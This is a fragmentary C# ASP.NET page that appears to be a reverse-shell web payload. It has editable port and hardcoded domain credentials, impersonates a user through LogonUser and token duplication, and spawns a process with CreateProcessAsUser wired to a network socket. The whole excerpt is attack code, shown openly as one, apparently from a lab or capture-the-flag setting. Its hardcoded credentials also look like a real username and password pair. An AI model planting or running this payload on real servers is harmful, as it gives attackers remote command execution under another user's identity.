  ...
  protected void Page_Load(object sender, EventArgs e)
    {
        ...
        int port = 6969; ////CHANGE THIS

        string userName = "Dizzy"; // CHANGE THIS
        string domainName = "matrix.local"; // CHANGE THIS
        string password = "SpinMeBabyyy"; // CHANGE THIS

        if (ImpersonateUser(userName, domainName, password)) {
   ...
   static extern bool DuplicateHandle(IntPtr hSourceProcessHandle,
    ...
    protected void SpawnProcess(IntPtr oursocket)
    {
        ...
        protected void SpawnProcessAsPriv(IntPtr oursocket)
        {
            ...
            IntPtr DuplicatedToken = new IntPtr(0);
            ...
            SECURITY_ATTRIBUTES x = new SECURITY_ATTRIBUTES();
            x.bInheritHandle = false;
            x.Length = Marshal.SizeOf(x);
            x.lpSecurityDescriptor = (IntPtr)0;

            IntPtr Token = WindowsIdentity.GetCurrent().Token;
            DuplicateTokenEx(Token, GENERIC_ALL, ref x, SECURITY_IMPERSONATION_LEVEL.SecurityImpersonation, (TOKEN_TYPE)TOKEN_INFORMATION_CLASS.TokenType, ref DuplicatedToken);

            if (DuplicatedToken == IntPtr.Zero)
            {
                CreateProcess(Application, "", ref pSec, ref pSec, true, 0, IntPtr.Zero, null, ref sInfo, out pInfo);
            }
            else
            {
                CreateProcessAsUser(DuplicatedToken, Application, "", ref pSec, ref pSec, true, 0, IntPtr.Zero, null, ref sInfo, out pInfo);
                WaitForSingleObject(pInfo.hProcess, (int)INFINITE);
                CloseHandle(DuplicatedToken);
            }
        }

        private static bool ImpersonateUser(string userName, string domainName, string password)
        {
            try
            {
                const int LOGON32_PROVIDER_DEFAULT = 0;
                const int LOGON32_LOGON_INTERACTIVE = 2;
                IntPtr safeTokenHandle = IntPtr.Zero;
                IntPtr dupTokenHandle = IntPtr.Zero;

                bool accessTokenHandleBool = LogonUser(userName, domainName, password, LOGON32_LOGON_INTERACTIVE, LOGON32_PROVIDER_DEFAULT, ref safeTokenHandle);

                Console.WriteLine("Called LogonUser API");
                
                if (accessTokenHandleBool == false)
                {
                    int ret = Marshal.GetLastWin32Error();
                    Console.WriteLine("Failed LogonUser call with {0}", ret);
                    throw new System.ComponentModel.Win32Exception(ret);
                }

                if (DuplicateToken(safeTokenHandle, LOGON32_LOGON_INTERACTIVE, ref dupTokenHandle) != 0)
                {
                    Console.WriteLine("LogonUser result: " + (accessTokenHandleBool ? "Yes" : "No"));
                    Console.WriteLine("Token Handle: {0}", safeTokenHandle);
                    Console.WriteLine("Running as user (Pre Impersonation): " + WindowsIdentity.GetCurrent().Name);
                    WindowsIdentity newIdentity = new WindowsIdentity(dupTokenHandle);
                    WindowsImpersonationContext impersonatedUser = newIdentity.Impersonate();
                    Console.WriteLine("Running as user (Post-Impersonation): " + WindowsIdentity.GetCurrent().Name);
                    CloseHandle(safeTokenHandle);
                    CloseHandle(dupTokenHandle);
                    Console.WriteLine("Reverted to user: " + WindowsIdentity.GetCurrent().Name);
                    return true;
                }
            }
